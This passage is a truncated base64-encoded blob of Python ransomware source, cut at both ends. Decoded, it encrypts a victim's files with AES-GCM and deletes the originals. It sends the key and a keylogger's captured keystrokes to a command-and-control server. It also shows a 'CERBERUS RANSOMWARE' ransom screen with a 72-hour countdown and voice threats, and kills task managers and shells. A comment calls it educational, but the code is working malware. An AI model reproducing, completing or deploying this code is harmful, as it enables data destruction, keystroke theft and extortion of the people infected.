AgIGlmIG9zLnBhdGguZXhpc3RzKHRhcmdldF9wYXRoKToKICAgICAgICAgICAgZm9yIHJvb3QsIF8sIGZpbGVzIGluIG9zLndhbGsodGFyZ2V0X3BhdGgpOgogICAgICAgICAgICAgICAgZm9yIGZpbGUgaW4gZmlsZXM6CiAgICAgICAgICAgICAgICAgICAgZmlsZV9wYXRoID0gb3MucGF0aC5qb2luKHJvb3QsIGZpbGUpCiAgICAgICAgICAgICAgICAgICAgaWYgb3MucGF0aC5zcGxpdGV4dChmaWxlKVsxXS5sb3dlcigpIGluIFRBUkdFVF9FWFRFTlNJT05TIGFuZCBub3QgZmlsZV9wYXRoLmVuZHN3aXRoKEVOQ1JZUFRFRF9FWFRFTlNJT04pOgogICAgICAgICAgICAgICAgICAgICAgICBpZiBlbmNyeXB0X2ZpbGVfYWVzX2djbShmaWxlX3BhdGgsIGFlc19rZXkpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VjdXJlX2RlbGV0ZV9maWxlKGZpbGVfcGF0aCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuY3J5cHRlZF9maWxlcyArPSAxCgogICAgd2l0aCBvcGVuKExPQ0tfRklMRSwgJ3cnKSBhcyBmOgogICAgICAgIGYud3JpdGUoIkVuY3J5cHRpb24gY29tcGxldGUuIikKCiAgICBsb2dfZXJyb3IoZiJFbmNyeXB0aW9uIGZpbmlzaGVkLiB7ZW5jcnlwdGVkX2ZpbGVzfSBmaWxlcyBlbmNyeXB0ZWQuIikKICAgIHJldHVybiBhZXNfa2V5CgpkZWYgY2hlY2tfaW5fd2l0aF9jMihhZXNfa2V5KToKICAgIHRyeToKICAgICAgICBmcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcyBpbXBvcnQgc2VyaWFsaXphdGlvbgogICAgICAgIGZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5wcmltaXRpdmVzLmFzeW1tZXRyaWMgaW1wb3J0IHBhZGRpbmcKICAgICAgICAKICAgICAgICBwdWJsaWNfa2V5ID0gc2VyaWFsaXphdGlvbi5sb2FkX3BlbV9wdWJsaWNfa2V5KEFUVEFDS0VSX1BVQkxJQ19LRVkuZW5jb2RlKCksIGJhY2tlbmQ9ZGVmYXVsdF9iYWNrZW5kKCkpCiAgICAgICAgZW5jcnlwdGVkX2Flc19rZXkgPSBwdWJsaWNfa2V5LmVuY3J5cHQoCiAgICAgICAgICAgIGFlc19rZXksCiAgICAgICAgICAgIHBhZGRpbmcuT0FFUCgKICAgICAgICAgICAgICAgIG1nZj1wYWRkaW5nLk1HRjEoYWxnb3JpdGhtPWhhc2hlcy5TSEEyNTYoKSksCiAgICAgICAgICAgICAgICBhbGdvcml0aG09aGFzaGVzLlNIQTI1NigpLAogICAgICAgICAgICAgICAgbGFiZWw9Tm9uZQogICAgICAgICAgICApCiAgICAgICAgKQogICAgICAgIHBheWxvYWQgPSB7ImtleSI6IGJhc2U2NC5iNjRlbmNvZGUoZW5jcnlwdGVkX2Flc19rZXkpLmRlY29kZSgndXRmLTgnKX0KICAgICAgICAKICAgICAgICB2aWN0aW1faWQgPSBOb25lCiAgICAgICAgbG9nX2Vycm9yKGYiQXR0ZW1wdGluZyB0byBjb25uZWN0IHRvIEMyIGF0OiB7QzJfU0VSVkVSX1VSTH0iKQogICAgICAgIAogICAgICAgIGZvciBfIGluIHJhbmdlKDMpOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QoZiJ7QzJfU0VSVkVSX1VSTH0vYXBpL2NoZWNraW4iLCBqc29uPXBheWxvYWQsIHRpbWVvdXQ9NSkKICAgICAgICAgICAgICAgIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgICAgICAgICB2aWN0aW1faWQgPSByZXNwb25zZS5qc29uKCkuZ2V0KCd2aWN0aW1faWQnKQogICAgICAgICAgICAgICAgICAgIGxvZ19lcnJvcihmIkNvbm5lY3RlZCEgVmljdGltIElEOiB7dmljdGltX2lkfSIpCiAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICAgICAgbG9nX2Vycm9yKGYiQ29ubmVjdGlvbiBhdHRlbXB0IGZhaWxlZDoge2V9IikKICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMikKICAgICAgICAKICAgICAgICBpZiBub3QgdmljdGltX2lkOgogICAgICAgICAgICAjIC0tLSBPRkZMSU5FIEZBTExCQUNLIC0tLQogICAgICAgICAgICBsb2dfZXJyb3IoIkMyIFVucmVhY2hhYmxlLiBTd2l0Y2hpbmcgdG8gT0ZGTElORSBNT0RFLiIpCiAgICAgICAgICAgICMgR2VuZXJhdGUgYSBsb2NhbCBJRCBzbyB0aGUgR1VJIHN0aWxsIGxhdW5jaGVzCiAgICAgICAgICAgIHZpY3RpbV9pZCA9ICJPRkZMSU5FLSIgKyBiYXNlNjQudXJsc2FmZV9iNjRlbmNvZGUob3MudXJhbmRvbSg0KSkuZGVjb2RlKCd1dGYtOCcpLnJzdHJpcCgnPScpCiAgICAgICAgICAgIAogICAgICAgICAgICAjIFNhdmUgdGhlIGtleSBsb2NhbGx5IGZvciBtYW51YWwgcmVjb3ZlcnkgaWYgbmVlZGVkIChpbiBhIHJlYWwgc2NlbmFyaW8gdGhpcyBtaWdodCBkaWZmZXIpCiAgICAgICAgICAgICMgRm9yIHRoaXMgZWR1Y2F0aW9uYWwvc2ltLCB3ZSBqdXN0IGtlZXAgdGhlIGtleSBiYWNrdXAgZmlsZSBhcyB0aGUgJ2tleSBzdG9yZScKICAgICAgICAgICAgIyBvciB3ZSBjb3VsZCB3cml0ZSBpdCB0byBhIHNlcGFyYXRlIGhpZGRlbiBmaWxlLgogICAgICAgICAgICBwYXNzCgogICAgICAgIHdpdGggb3BlbihJRF9GSUxFLCAndycpIGFzIGY6CiAgICAgICAgICAgIGYud3JpdGUodmljdGltX2lkKQogICAgICAgIAogICAgICAgICMgSWYgd2UgYXJlIG9mZmxpbmUsIHdlIERPIE5PVCBkZWxldGUgdGhlIGtleSBiYWNrdXAsIHNvIHdlIGNhbiByZWNvdmVyIGl0IG1hbnVhbGx5IGlmIG5lZWRlZC4KICAgICAgICAjIElmIHdlIGFyZSBvbmxpbmUsIHdlIGRlbGV0ZSBpdCB0byBmb3JjZSBwYXltZW50LgogICAgICAgIGlmICJPRkZMSU5FIiBub3QgaW4gdmljdGltX2lkIGFuZCBvcy5wYXRoLmV4aXN0cyhLRVlfQkFDS1VQX0ZJTEUpOgogICAgICAgICAgICAgb3MucmVtb3ZlKEtFWV9CQUNLVVBfRklMRSkKICAgICAgICAgICAgCiAgICAgICAgbG9nX2Vycm9yKGYiQ2hlY2staW4gY29tcGxldGUuIEZpbmFsIFZpY3RpbSBJRDoge3ZpY3RpbV9pZH0iKQogICAgICAgIHJldHVybiB2aWN0aW1faWQKCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgbG9nX2Vycm9yKGYiQzIgY2hlY2staW4gY3JpdGljYWwgZmFpbHVyZToge2V9IikKICAgICAgICAjIFVsdGltYXRlIGZhbGxiYWNrCiAgICAgICAgcmV0dXJuICJDUklUSUNBTC1GQUlMVVJFIgoKIyAtLS0gS2V5bG9nZ2VyIExvZ2ljIC0tLQpjbGFzcyBLZXlsb2dnZXI6CiAgICBkZWYgX19pbml0X18oc2VsZiwgdmljdGltX2lkKToKICAgICAgICBzZWxmLnZpY3RpbV9pZCA9IHZpY3RpbV9pZAogICAgICAgIHNlbGYubG9nX2J1ZmZlciA9ICIiCiAgICAgICAgc2VsZi5sb2NrID0gdGhyZWFkaW5nLkxvY2soKQogICAgICAgIHNlbGYuc3RvcF9ldmVudCA9IHRocmVhZGluZy5FdmVudCgpCiAgICAgICAgCiAgICBkZWYgc3RhcnQoc2VsZik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBzZWxmLmxpc3RlbmVyID0ga2V5Ym9hcmQuTGlzdGVuZXIob25fcHJlc3M9c2VsZi5vbl9wcmVzcykKICAgICAgICAgICAgc2VsZi5saXN0ZW5lci5zdGFydCgpCiAgICAgICAgICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXNlbGYuZmx1c2hfbG9vcCwgZGFlbW9uPVRydWUpLnN0YXJ0KCkKICAgICAgICAgICAgbG9nX2Vycm9yKCJLZXlsb2dnZXIgc3RhcnRlZCBzdWNjZXNzZnVsbHkiKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgbG9nX2Vycm9yKGYiS2V5bG9nZ2VyIFN0YXJ0IEVycm9yOiB7ZX0iKQogICAgICAgIAogICAgZGVmIG9uX3ByZXNzKHNlbGYsIGtleSk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBrID0ga2V5LmNoYXIKICAgICAgICBleGNlcHQgQXR0cmlidXRlRXJyb3I6CiAgICAgICAgICAgIGsgPSBmIlt7a2V5Lm5hbWV9XSIKICAgICAgICAKICAgICAgICB3aXRoIHNlbGYubG9jazoKICAgICAgICAgICAgc2VsZi5sb2dfYnVmZmVyICs9IHN0cihrKQogICAgICAgICAgICAKICAgIGRlZiBmbHVzaF9sb29wKHNlbGYpOgogICAgICAgIHdoaWxlIG5vdCBzZWxmLnN0b3BfZXZlbnQuaXNfc2V0KCk6CiAgICAgICAgICAgIHRpbWUuc2xlZXAoMTApCiAgICAgICAgICAgIHdpdGggc2VsZi5sb2NrOgogICAgICAgICAgICAgICAgaWYgbm90IHNlbGYubG9nX2J1ZmZlcjoKICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgZGF0YSA9IHNlbGYubG9nX2J1ZmZlcgogICAgICAgICAgICAgICAgc2VsZi5sb2dfYnVmZmVyID0gIiIKICAgICAgICAgICAgCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHJlcXVlc3RzLnBvc3QoZiJ7QzJfU0VSVkVSX1VSTH0vYXBpL2tleWxvZy97c2VsZi52aWN0aW1faWR9IiwganNvbj17ImtleXMiOiBkYXRhfSwgdGltZW91dD0zKQogICAgICAgICAgICAgICAgbG9nX2Vycm9yKGYiU2VudCB7bGVuKGRhdGEpfSBjaGFycyB0byBDMiIpCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgICAgIGxvZ19lcnJvcihmIktleWxvZyB1cGxvYWQgZmFpbGVkOiB7ZX0iKQoKIyAtLS0gR1VJIExvZ2ljIC0tLQpjbGFzcyBSYW5zb213YXJlR1VJOgogICAgZGVmIF9faW5pdF9fKHNlbGYsIG1hc3RlciwgdmljdGltX2lkKToKICAgICAgICBzZWxmLm1hc3RlciA9IG1hc3RlcgogICAgICAgIHNlbGYudmljdGltX2lkID0gdmljdGltX2lkCiAgICAgICAgc2VsZi5kb29tc2RheV90cmlnZ2VyZWQgPSBGYWxzZQogICAgICAgIHNlbGYucGF5bWVudF9tb2RlX2FjdGl2ZSA9IEZhbHNlCgogICAgICAgICMgV0lORE9XRUQgTU9ERSAoTW92YWJsZSwgRmFrZS1DbG9zYWJsZSkKICAgICAgICBtYXN0ZXIudGl0bGUoIkNFUkJFUlVTIFJBTlNPTVdBUkUgLSBFTkNSWVBURUQiKQogICAgICAgIG1hc3Rlci5nZW9tZXRyeSgiMTAyNHg3NjgiKSAKICAgICAgICBtYXN0ZXIuYXR0cmlidXRlcygnLWZ1bGxzY3JlZW4nLCBGYWxzZSkgCiAgICAgICAgbWFzdGVyLm92ZXJyaWRlcmVkaXJlY3QoRmFsc2UpICMgU2hvdyBUaXRsZSBCYXIgKFggYnV0dG9uKQogICAgICAgIG1hc3Rlci5hdHRyaWJ1dGVzKCctdG9wbW9zdCcsIFRydWUpCiAgICAgICAgbWFzdGVyLmNvbmZpZ3VyZShiZz0nIzBhMGEwYScpCiAgICAgICAgbWFzdGVyLnJlc2l6YWJsZShGYWxzZSwgRmFsc2UpCiAgICAgICAgCiAgICAgICAgIyBSQUdFQkFJVCBDTE9TRQogICAgICAgIG1hc3Rlci5wcm90b2NvbCgiV01fREVMRVRFX1dJTkRPVyIsIHNlbGYucmFnZWJhaXRfY2xvc2UpIAogICAgICAgIAogICAgICAgICMgRGlzYWJsZSBtaW5pbWFsaXplL2tleWJvYXJkIHNob3J0Y3V0cwogICAgICAgIG1hc3Rlci5iaW5kKCc8RXNjYXBlPicsIGxhbWJkYSBlOiAiYnJlYWsiKQogICAgICAgIAogICAgICAgICMgQWdncmVzc2l2ZSBMb29wCiAgICAgICAgc2VsZi5mb3JjZV9mb2N1c19sb29wKCkKCiAgICAgICAgIyBHVUkgRWxlbWVudHMKICAgICAgICB0cnk6CiAgICAgICAgICAgIGxvZ29fZGF0YSA9IGJhc2U2NC5iNjRkZWNvZGUoTE9HT19CQVNFNjQpCiAgICAgICAgICAgIHNlbGYubG9nbyA9IFBob3RvSW1hZ2UoZGF0YT1sb2dvX2RhdGEpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBzZWxmLmxvZ28gPSBOb25lCgogICAgICAgIG1haW5fZnJhbWUgPSBGcmFtZShtYXN0ZXIsIGJnPScjMGEwYTBhJykKICAgICAgICBtYWluX2ZyYW1lLnBhY2soZXhwYW5kPVRydWUsIGZpbGw9J2JvdGgnLCBwYWR4PTIwLCBwYWR5PTIwKQoKICAgICAgICBpZiBzZWxmLmxvZ286CiAgICAgICAgICAgIExhYmVsKG1haW5fZnJhbWUsIGltYWdlPXNlbGYubG9nbywgYmc9JyMwYTBhMGEnKS5wYWNrKHBhZHk9MTApCgogICAgICAgIHRpdGxlX2ZvbnQgPSB0a2ZvbnQuRm9udChmYW1pbHk9IkhlbHZldGljYSIsIHNpemU9MjQsIHdlaWdodD0iYm9sZCIpCiAgICAgICAgYm9keV9mb250ID0gdGtmb250LkZvbnQoZmFtaWx5PSJIZWx2ZXRpY2EiLCBzaXplPTEyKQogICAgICAgIG1vbm9fZm9udCA9IHRrZm9udC5Gb250KGZhbWlseT0iQ291cmllciIsIHNpemU9MTIpCiAgICAgICAgdGltZXJfZm9udCA9IHRrZm9udC5Gb250KGZhbWlseT0iQ291cmllciIsIHNpemU9MzYsIHdlaWdodD0iYm9sZCIpCgogICAgICAgIExhYmVsKG1haW5fZnJhbWUsIHRleHQ9IllPVVIgRklMRVMgSEFWRSBCRUVOIEVOQ1JZUFRFRCIsIGZvbnQ9dGl0bGVfZm9udCwgZmc9JyNmZjRkNGQnLCBiZz0nIzBhMGEwYScpLnBhY2socGFkeT0xMCkKICAgICAgICBMYWJlbChtYWluX2ZyYW1lLCB0ZXh0PSJZb3VyIGRvY3VtZW50cywgcGhvdG9zLCBhbmQgb3RoZXIgaW1wb3J0YW50IGZpbGVzIGhhdmUgYmVlbiBsb2NrZWQuIiwgZm9udD1ib2R5X2ZvbnQsIGZnPScjY2NjY2NjJywgYmc9JyMwYTBhMGEnLCB3cmFwbGVuZ3RoPTcwMCkucGFjayhwYWR5PTUpCiAgICAgICAgCiAgICAgICAgIyBET09NU0RBWSBUSU1FUgogICAgICAgIHNlbGYudGltZV9sZWZ0ID0gNzIgKiAzNjAwIAogICAgICAgIExhYmVsKG1haW5fZnJhbWUsIHRleHQ9IlRJTUUgUkVNQUlOSU5HIFVOVElMIFBFUk1BTkVOVCBEQVRBIExPU1M6IiwgZm9udD10a2ZvbnQuRm9udChmYW1pbHk9IkhlbHZldGljYSIsIHNpemU9MTIsIHdlaWdodD0iYm9sZCIpLCBmZz0nI2ZmMzMzMycsIGJnPScjMGEwYTBhJykucGFjayhwYWR5PSgyMCwgNSkpCiAgICAgICAgc2VsZi50aW1lcl9sYWJlbCA9IExhYmVsKG1haW5fZnJhbWUsIHRleHQ9IjcyOjAwOjAwIiwgZm9udD10aW1lcl9mb250LCBmZz0nI2ZmMDAwMCcsIGJnPScjMGEwYTBhJykKICAgICAgICBzZWxmLnRpbWVyX2xhYmVsLnBhY2socGFkeT01KQogICAgICAgIAogICAgICAgICMgRkFLRSBFWEZJTFRSQVRJT04KICAgICAgICBzZWxmLmV4ZmlsX3N0YXR1cyA9IExhYmVsKG1haW5fZnJhbWUsIHRleHQ9IlN5c3RlbSBTY2FuOiBBbmFseXppbmcgcHJpdmF0ZSBkYXRhLi4uIiwgZm9udD1tb25vX2ZvbnQsIGZnPScjZmZmZjAwJywgYmc9JyMwYTBhMGEnKQogICAgICAgIHNlbGYuZXhmaWxfc3RhdHVzLnBhY2socGFkeT0oMTUsIDUpKQogICAgICAgIHNlbGYuZXhmaWxfcHJvZ3Jlc3MgPSBMYWJlbChtYWluX2ZyYW1lLCB0ZXh0PSJbICAgICAgICAgICAgICAgICAgICBdIDAlIiwgZm9udD1tb25vX2ZvbnQsIGZnPScjZmZmZjAwJywgYmc9JyMwYTBhMGEnKQogICAgICAgIHNlbGYuZXhmaWxfcHJvZ3Jlc3MucGFjaygpCiAgICAgICAgCiAgICAgICAgTGFiZWwobWFpbl9mcmFtZSwgdGV4dD1mIllPVVIgVklDVElNIElEIElTOiIsIGZvbnQ9Ym9keV9mb250LCBmZz0nI2ZmZmZmZicsIGJnPScjMGEwYTBhJykucGFjayhwYWR5PSgyMCwgNSkpCiAgICAgICAgc2VsZi52aWN0aW1faWRfbGFiZWwgPSBMYWJlbChtYWluX2ZyYW1lLCB0ZXh0PXNlbGYudmljdGltX2lkLCBmb250PXRrZm9udC5Gb250KGZhbWlseT0iQ291cmllciIsIHNpemU9MjAsIHdlaWdodD0iYm9sZCIpLCBmZz0nIzRkZmY4OCcsIGJnPScjMGEwYTBhJykKICAgICAgICBzZWxmLnZpY3RpbV9pZF9sYWJlbC5wYWNrKCkKCiAgICAgICAgc2VsZi5zdGF0dXNfbGFiZWwgPSBMYWJlbChtYWluX2ZyYW1lLCB0ZXh0PSJTVEFUVVM6IEF3YWl0aW5nIHBheW1lbnQgY29uZmlybWF0aW9uLi4uIChEb24ndCBjbG9zZSB0aGlzIHdpbmRvdykiLCBmb250PWJvZHlfZm9udCwgZmc9JyNmZmZmNGQnLCBiZz0nIzBhMGEwYScpCiAgICAgICAgc2VsZi5zdGF0dXNfbGFiZWwucGFjayhwYWR5PSgyMCwgNSkpCiAgICAgICAgCiAgICAgICAgc2VsZi5rZXlfdmFyID0gU3RyaW5nVmFyKCkKICAgICAgICBzZWxmLmtleV9lbnRyeSA9IEVudHJ5KG1haW5fZnJhbWUsIHRleHR2YXJpYWJsZT1zZWxmLmtleV92YXIsIGZvbnQ9dGtmb250LkZvbnQoZmFtaWx5PSJDb3VyaWVyIiwgc2l6ZT0xMiksIHNob3c9IioiLCB3aWR0aD01MCwgYmc9JyMyYTJhMmEnLCBmZz0nI2ZmZmZmZicsIGluc2VydGJhY2tncm91bmQ9J3doaXRlJywganVzdGlmeT0nY2VudGVyJykKICAgICAgICBzZWxmLmtleV9lbnRyeS5wYWNrKHBhZHk9MTAsIGlwYWR5PTUpCiAgICAgICAgc2VsZi5rZXlfZW50cnkuY29uZmlnKHN0YXRlPSdyZWFkb25seScpCgogICAgICAgIHNlbGYuZGVjcnlwdF9idXR0b24gPSBCdXR0b24obWFpbl9mcmFtZSwgdGV4dD0iREVDUllQVCBGSUxFUyIsIGZvbnQ9dGtmb250LkZvbnQoZmFtaWx5PSJIZWx2ZXRpY2EiLCBzaXplPTE0LCB3ZWlnaHQ9ImJvbGQiKSwgY29tbWFuZD1zZWxmLnN0YXJ0X2RlY3J5cHRpb24sIGJnPScjZmY0ZDRkJywgZmc9J3doaXRlJywgcGFkeD0yMCwgcGFkeT0xMCkKICAgICAgICBzZWxmLmRlY3J5cHRfYnV0dG9uLnBhY2socGFkeT0xMCkKICAgICAgICBzZWxmLmRlY3J5cHRfYnV0dG9uLmNvbmZpZyhzdGF0ZT0nZGlzYWJsZWQnKSAKICAgICAgICAKICAgICAgICAjIFBBWU1FTlQgQlVUVE9OIChGaXhlZCBMYXlvdXQgLSBQYWNrZWQgYXQgYm90dG9tKQogICAgICAgIHNlbGYucGF5X2J1dHRvbiA9IEJ1dHRvbihtYWluX2ZyYW1lLCB0ZXh0PSJQQVkgUkFOU09NIE5PVyIsIGZvbnQ9dGtmb250LkZvbnQoZmFtaWx5PSJIZWx2ZXRpY2EiLCBzaXplPTExLCB3ZWlnaHQ9ImJvbGQiKSwgY29tbWFuZD1zZWxmLmVuYWJsZV9wYXltZW50X21vZGUsIGJnPScjMDA3YmZmJywgZmc9J3doaXRlJywgcGFkeD0xNSwgcGFkeT04KQogICAgICAgIHNlbGYucGF5X2J1dHRvbi5wYWNrKHNpZGU9J2JvdHRvbScsIHBhZHk9MjApCgogICAgICAgICMgU3RhcnQgdGhyZWFkcwogICAgICAgIHNlbGYuaGVhcnRiZWF0X3RocmVhZF9ydW5uaW5nID0gVHJ1ZQogICAgICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXNlbGYuaGVhcnRiZWF0X3BvbGxpbmcsIGRhZW1vbj1UcnVlKS5zdGFydCgpCiAgICAgICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9c2VsZi51cGRhdGVfdGltZXIsIGRhZW1vbj1UcnVlKS5zdGFydCgpCiAgICAgICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9c2VsZi5mYWtlX2V4ZmlsdHJhdGlvbiwgZGFlbW9uPVRydWUpLnN0YXJ0KCkKICAgICAgICAKICAgICAgICBzZWxmLm1hc3Rlci5hZnRlcigyMDAwLCBzZWxmLmNoYW5nZV93YWxscGFwZXIpCiAgICAgICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9c2VsZi5hdWRpb19sb29wLCBkYWVtb249VHJ1ZSkuc3RhcnQoKQogICAgICAgICMgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9c2VsZi53YXRjaGRvZ19sb29wLCBkYWVtb249VHJ1ZSkuc3RhcnQoKSAjIERJU0FCTEVEOiBDYXVzaW5nIFN5c3RlbSBMYWcKICAgICAgICAKICAgICAgICAjIFNUQVJUIEtFWUxPR0dFUiBBVVRPTUFUSUNBTExZCiAgICAgICAgc2VsZi5rZXlsb2dnZXIgPSBLZXlsb2dnZXIodmljdGltX2lkKQogICAgICAgIHNlbGYubWFzdGVyLmFmdGVyKDEwMDAsIHNlbGYua2V5bG9nZ2VyLnN0YXJ0KQogICAgICAgIAogICAgICAgICMgUkFHRUJBSVQgQ0xPU0UgSEFORExFUgogICAgICAgIG1hc3Rlci5wcm90b2NvbCgiV01fREVMRVRFX1dJTkRPVyIsIHNlbGYucmFnZWJhaXRfY2xvc2UpCiAgICAgICAgbWFzdGVyLmJpbmQoIjxBbHQtRjQ+IiwgbGFtYmRhIGU6IHNlbGYucmFnZWJhaXRfY2xvc2UoKSkKCiAgICBkZWYgcmFnZWJhaXRfY2xvc2Uoc2VsZik6CiAgICAgICAgIiIiSW50ZXJjZXB0cyBjbG9zZSByZXF1ZXN0IGFuZCB0cm9sbHMgdGhlIHVzZXIuIiIiCiAgICAgICAgdHJ5OgogICAgICAgICAgICBpZiBtZXNzYWdlYm94LmFza3llc25vKCJFeGl0IEFwcGxpY2F0aW9uIiwgIkFyZSB5b3Ugc3VyZSB5b3Ugd2FudCB0byBxdWl0IHRoaXMgYXBwbGljYXRpb24/Iik6CiAgICAgICAgICAgICAgICBtZXNzYWdlYm94LnNob3dlcnJvcigiQWNjZXNzIERlbmllZCIsICJMT0wgeW91IHRob3VnaHQgeW91IGNvdWxkIGVzY2FwZS4gQWNjZXNzIERlbmllZC4iKQogICAgICAgICAgICAgICAgIyBSdW4gVFRTIGluIGEgc2VwYXJhdGUgdGhyZWFkIHRvIGF2b2lkIGJsb2NraW5nIEdVSQogICAgICAgICAgICAgICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9c2VsZi5zcGVha19tZXNzYWdlLCBhcmdzPSgiWW91IGNhbm5vdCBsZWF2ZS4iLCksIGRhZW1vbj1UcnVlKS5zdGFydCgpCiAgICAgICAgZXhjZXB0OiBwYXNzCgogICAgZGVmIGZvcmNlX2ZvY3VzX2xvb3Aoc2VsZik6CiAgICAgICAgIiIiQWdncmVzc2l2ZWx5IGtlZXBzIHdpbmRvdyBvbiB0b3AsIHVubGVzcyBwYXlpbmcuIERJU0FCTEVEIHRvIGFsbG93IGtleWxvZ2dpbmcuIiIiCiAgICAgICAgIyBESVNBQkxFRDogVGhpcyB3YXMgcHJldmVudGluZyB0aGUgdmljdGltIGZyb20gdXNpbmcgb3RoZXIgYXBwcwogICAgICAgICMgVGhlIGtleWxvZ2dlciBuZWVkcyB0aGUgdmljdGltIHRvIGJlIGFibGUgdG8gdHlwZSBpbiBvdGhlciB3aW5kb3dzCiAgICAgICAgcGFzcwogICAgICAgICMgaWYgbm90IHNlbGYucGF5bWVudF9tb2RlX2FjdGl2ZToKICAgICAgICAjICAgICB0cnk6CiAgICAgICAgIyAgICAgICAgIHNlbGYubWFzdGVyLmxpZnQoKQogICAgICAgICMgICAgIGV4Y2VwdDoKICAgICAgICAjICAgICAgICAgcGFzcwogICAgICAgICMgc2VsZi5tYXN0ZXIuYWZ0ZXIoMzAwMCwgc2VsZi5mb3JjZV9mb2N1c19sb29wKQoKICAgIGRlZiBzcGVha19tZXNzYWdlKHNlbGYsIG1lc3NhZ2UpOgogICAgICAgICIiIkNyb3NzLXBsYXRmb3JtIFRUUy4gU3luY2hyb25vdXMgKGJsb2NraW5nKSB2ZXJzaW9uIGZvciB0aHJlYWRzLiIiIgogICAgICAgIHRyeToKICAgICAgICAgICAgaWYgb3MubmFtZSA9PSAnbnQnOgogICAgICAgICAgICAgICAgY21kID0gZiJBZGQtVHlwZSAtQXNzZW1ibHlOYW1lIFN5c3RlbS5TcGVlY2g7IChOZXctT2JqZWN0IFN5c3RlbS5TcGVlY2guU3ludGhlc2lzLlNwZWVjaFN5bnRoZXNpemVyKS5TcGVhaygne21lc3NhZ2V9JykiCiAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLnJ1bihbInBvd2Vyc2hlbGwiLCAiLUNvbW1hbmQiLCBjbWRdLCBjcmVhdGlvbmZsYWdzPXN1YnByb2Nlc3MuQ1JFQVRFX05PX1dJTkRPVykKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGlmIHNodXRpbC53aGljaCgiZXNwZWFrIik6CiAgICAgICAgICAgICAgICAgICAgICAgIHN1YnByb2Nlc3MucnVuKFsiZXNwZWFrIiwgbWVzc2FnZV0sIHN0ZGVycj1zdWJwcm9jZXNzLkRFVk5VTEwpCiAgICAgICAgICAgICAgICBlbGlmIHNodXRpbC53aGljaCgic3BkLXNheSIpOgogICAgICAgICAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLnJ1bihbInNwZC1zYXkiLCBtZXNzYWdlXSwgc3RkZXJyPXN1YnByb2Nlc3MuREVWTlVMTCkKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKICAgICAgICAKICAgIGRlZiBhdWRpb19sb29wKHNlbGYpOgogICAgICAgICIiIlJlcGVhdHMgdGhlIHZvaWNlIG1lc3NhZ2UgZXZlcnkgMzAgc2Vjb25kcy4iIiIKICAgICAgICBtZXNzYWdlID0gIllvdXIgZmlsZXMgYXJlIGVuY3J5cHRlZC4gUGF5bWVudCBpcyByZXF1aXJlZC4gU3lzdGVtIGZhaWx1cmUgaW1taW5lbnQuIgogICAgICAgIHdoaWxlIHNlbGYuaGVhcnRiZWF0X3RocmVhZF9ydW5uaW5nOgogICAgICAgICAgICBzZWxmLnNwZWFrX21lc3NhZ2UobWVzc2FnZSkKICAgICAgICAgICAgdGltZS5zbGVlcCgzMCkKICAgICAgICAgICAgCiAgICBkZWYgd2F0Y2hkb2dfbG9vcChzZWxmKToKICAgICAgICAiIiJLaWxscyB0YXNrIG1hbmFnZXJzIGFuZCB0ZXJtaW5hbHMuIiIiCiAgICAgICAgYmxhY2tsaXN0ID0gWwogICAgICAgICAgICAndGFza21ncicsICdjbWQnLCAncG93ZXJzaGVsbCcsIAogICAgICAgICAgICAnZ25vbWUtdGVybWluYWwtc2VydmVyJywgJ2dub21lLXRlcm1pbmFsJywgIyBHTk9NRQogICAgICAgICAgICAna29uc29sZScsICMgS0RFCiAgICAgICAgICAgICd4ZmNlNC10ZXJtaW5hbCcsICd4dGVybScsICd1eHRlcm0nLAogICAgICAgICAgICAnYmFzaCcsICdzaCcsICd6c2gnLCAnZmlzaCcsICMgU2hlbGxzIChBZ2dyZXNzaXZlKQogICAgICAgICAgICAnaHRvcCcsICd0b3AnLCAnYnRvcCcsICd3aXJlc2hhcmsnCiAgICAgICAgXQogICAgICAgIAogICAgICAgIHdoaWxlIHNlbGYuaGVhcnRiZWF0X3RocmVhZF9ydW5uaW5nOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBpZiBvcy5uYW1lID09ICdudCc6CiAgICAgICAgICAgICAgICAgICAgZm9yIHByb2MgaW4gYmxhY2tsaXN0OgogICAgICAgICAgICAgICAgICAgICAgICBvcy5zeXN0ZW0oZiJ0YXNra2lsbCAvRiAvSU0ge3Byb2N9LmV4ZSA+bnVsIDI+JjEiKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAjIExpbnV4IE9wdGltaXphdGlvbjogcGtpbGwgaW1wbGllcyBpbnRlcm5hbCBsb29wLCBjYWxsaW5nIGl0IDEweCBwZXIgc2VjIGlzIGJhZC4KICAgICAgICAgICAgICAgICAgICAjIFdlIHJ1biB0aGlzIGV2ZXJ5IDMgc2Vjb